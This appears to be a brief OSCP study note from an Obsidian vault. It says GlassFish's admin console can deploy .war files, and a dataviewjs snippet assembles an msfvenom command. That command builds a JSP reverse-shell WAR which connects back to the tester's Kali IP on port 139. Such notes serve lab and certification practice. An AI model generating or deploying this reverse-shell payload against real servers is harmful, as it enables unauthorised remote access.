GlassFish Server allows the deployment of _.war_ files through its web-based admin console

LPORT 139 | shell.war
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${KaliIP} LPORT=139 -f war >shell.war`;

dv.paragraph("```bash\n" + command + "\n```");
```
